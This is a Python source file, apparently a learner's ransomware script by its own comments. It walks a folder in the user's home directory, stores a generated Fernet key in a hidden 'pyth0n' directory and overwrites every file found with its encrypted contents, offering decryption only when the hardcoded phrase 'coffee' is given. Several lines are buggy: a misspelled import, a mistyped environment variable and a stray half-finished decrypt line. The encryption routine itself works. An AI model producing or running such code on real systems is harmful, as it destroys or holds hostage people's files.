from pathlib import Path
from cryptography.fernet import Fernet
import sys 
import tinker as tk 
from tkinter import messagebox
from PIL import Image, ImageTk
import os

# get the home directory
home_dir = Path.home()
print(home_dir)

target_folder = Path.home()/"Peter_cyber"

# folders to be igrnoed when encrypting files 
ignore_folder = ["AppData", "Library","Local Settings", ".git", "Node Modules"]

# a folder where this ransomware will

#for linux
app_data =os.path.join(os.environ["ZDOTDIR"], "pyth0n")

#for windows
#app_data =os.path.join(os.environ["APPADAT"], "pyth0n")

# create the folder 

os.makedirs(app_data, exist_ok=True)

# create a path to store the encryption key
key_path = os.path.join(app_data, "key.key")

# Create function to encrypt file
def encrypt ():
    # Create a list to store all the files
    files = []

    #Find all the files and folders
    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in ignore_folder):
                continue # Skip this folder

            if item.is_file():
                # Append the file to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError) :
            continue

    # print(len(files))


    # Generate encryption key
    key_file=Path(key_path)
    if not key_file.exists():
        key=Fernet.generate_key()

        with open (key_file,"wb")as keyFile:
            keyFile.write(key)
    else:
        with open(key_file, "rb")as keyFile:
            key= keyFile.read()

    # Use key to encrypt files
    for file in files:
        with open (file,"rb")as originalFile:
            content=originalFile.read()
            encrypted_content = Fernet(key).encrypt(content)

            # Write the changes t the file
            with open(file,"wb") as newFile:
                newFile.write(encrypted_content)



# Create function to decrypt file
def decrypt (user_phrase):
    # Create a list to store all the files
    files = []

    #Find all the files and folders
    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in ignore_folder):
                continue # Skip this folder

            if item.is_file():
                # Append the file to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError) :
            continue

    # print(len(files))


    # Read encryption key
    key_file=Path(key_path)
    
    with open(key_file, "rb")as keyFile:
        key= keyFile.read()

    # Create a secret code that will be used to decrypt
    secret_phrase = "coffee"

    # Check if secret phrase is correct
    if user_phrase.lower()== secret_phrase.lower():

        # Use key to decrypt files
        for file in files:
            with open (file,"rb")as encryptedFile:
                    content=encryptedFile.read()
            decrypted_content = Fernet(key).decrypt
            
            decrypted_content = Fernet(key).decrypt(content)

            # Write the changes t the file
            with open(file,"wb") as newFile:
                newFile.write(decrypted_content)

#encrypt()